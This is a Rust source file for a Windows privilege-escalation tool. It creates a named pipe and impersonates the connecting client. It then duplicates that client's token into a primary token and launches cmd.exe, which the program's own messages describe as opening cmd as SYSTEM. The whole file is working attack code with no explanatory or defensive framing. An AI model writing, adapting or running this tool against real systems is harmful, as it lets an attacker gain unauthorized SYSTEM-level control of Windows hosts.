use std::{env, ptr, mem, str, process};

use windows::Win32::Security::{DuplicateTokenEx, TOKEN_TYPE, SECURITY_IMPERSONATION_LEVEL, TOKEN_ACCESS_MASK};
use windows::Win32::Security::{GetTokenInformation, TOKEN_INFORMATION_CLASS, Authorization::ConvertSidToStringSidW, TOKEN_USER};
use windows::Win32::Storage::FileSystem::{PIPE_ACCESS_DUPLEX};
use windows::Win32::System::Pipes::{CreateNamedPipeA, ConnectNamedPipe, ImpersonateNamedPipeClient, PIPE_TYPE_BYTE, PIPE_READMODE_BYTE};
use windows::Win32::Foundation::{HANDLE, WIN32_ERROR, GetLastError, INVALID_HANDLE_VALUE};
use windows::Win32::System::Threading::{GetCurrentThread, OpenThreadToken, CreateProcessWithTokenW, CREATE_PROCESS_LOGON_FLAGS, STARTUPINFOW, PROCESS_INFORMATION};
use windows::core::{PCSTR, PWSTR, PCWSTR};
use windows::{w};
use std::ffi::c_void;

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        println!(r"Usage: token_impersonation.exe \\.\pipe\pipename");
        process::exit(1);
    }
    let mut pipename: Vec<u8> = [args[1].as_bytes(), "\0".as_bytes()].concat();
    
    unsafe {
        let p_name: PCSTR = PCSTR::from_raw(pipename.as_mut_ptr());
        println!("[+] Creating named pipe {}", str::from_utf8(&pipename).unwrap());
        let h_pipe: HANDLE = CreateNamedPipeA(
            p_name,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE,
            10,
            2048,
            2048,
            0,
            ptr::null_mut()
        ).unwrap();
        println!("[+] Listening...");

        if !ConnectNamedPipe(h_pipe,  ptr::null_mut()).as_bool() {
            let e: WIN32_ERROR = GetLastError();
            panic!("Error connecting to pipe: {:?}", e);
        }

        println!("[+] Client connected...impersonating user");
        if !ImpersonateNamedPipeClient(h_pipe).as_bool() {
            let e: WIN32_ERROR = GetLastError();
            panic!("Error impersonating named pipe client: {:?}", e);
        }
        println!("[+] Impersonating user OK");

        let mut h_token: HANDLE = INVALID_HANDLE_VALUE;

        if !OpenThreadToken(
            GetCurrentThread(),
            TOKEN_ACCESS_MASK(983551),
            false,
            &mut h_token as *mut HANDLE
        ).as_bool() {
            let e: WIN32_ERROR = GetLastError();
            panic!("Error opening thread token: {:?}", e);
        } 
        println!("[+] Thread token opened");

        let mut token_info_len: u32 = 0;
        let mut token_user_info: *mut TOKEN_USER = ptr::null_mut();
        println!("[+] Getting token information");
        GetTokenInformation(
            h_token,
            TOKEN_INFORMATION_CLASS(1),
            token_user_info as *mut c_void,
            0,
            &mut token_info_len as *mut u32
        );

        let mut token_user_info_vec = Vec::with_capacity(token_info_len as usize);
        token_user_info = token_user_info_vec.as_mut_ptr() as *mut TOKEN_USER;
        if !GetTokenInformation(
            h_token,
            TOKEN_INFORMATION_CLASS(1),
            token_user_info as *mut c_void,
            token_info_len,
            &mut token_info_len as *mut u32
        ).as_bool() {
            let e: WIN32_ERROR = GetLastError();
            panic!("Error getting token information: {:?}", e);
        }

        let mut p_str_sid: PWSTR = PWSTR::null();

        println!("[+] Getting SID");
        if !ConvertSidToStringSidW((*token_user_info).User.Sid, &mut p_str_sid as *mut PWSTR).as_bool() {
            let e: WIN32_ERROR = GetLastError();
            panic!("Error getting SID: {:?}", e);
        }

        let priv_sid: String = p_str_sid.to_string().unwrap();

        println!("[+] Found SID: {priv_sid}");

        let mut ph_newtoken: HANDLE = INVALID_HANDLE_VALUE;

        println!("[+] Creating primary token from impersonation token");
        if !DuplicateTokenEx(
            h_token,
            TOKEN_ACCESS_MASK(983551),
            ptr::null_mut(),
            SECURITY_IMPERSONATION_LEVEL(2),
            TOKEN_TYPE(1),
            &mut ph_newtoken as *mut HANDLE
        ).as_bool() {
            let e: WIN32_ERROR = GetLastError();
            panic!("Error converting token: {:?}", e);
        }

        println!("[+] Opening cmd as SYSTEM");
        let cmd_str: PWSTR = PWSTR::from_raw(w!("C:\\Windows\\System32\\cmd.exe").as_ptr() as *mut u16);
        let mut si: STARTUPINFOW = STARTUPINFOW::default();
        si.cb = mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = PROCESS_INFORMATION::default();
        if !CreateProcessWithTokenW(
            ph_newtoken,
            CREATE_PROCESS_LOGON_FLAGS(0),
            PCWSTR::null(),
            cmd_str,
            0,
            ptr::null() as *const c_void,
            PCWSTR::null(),
            &mut si,
            &mut pi as *mut PROCESS_INFORMATION
        ).as_bool() {
            let e: WIN32_ERROR = GetLastError();
            panic!("Error starting process: {:?}", e);
        }
    }
}
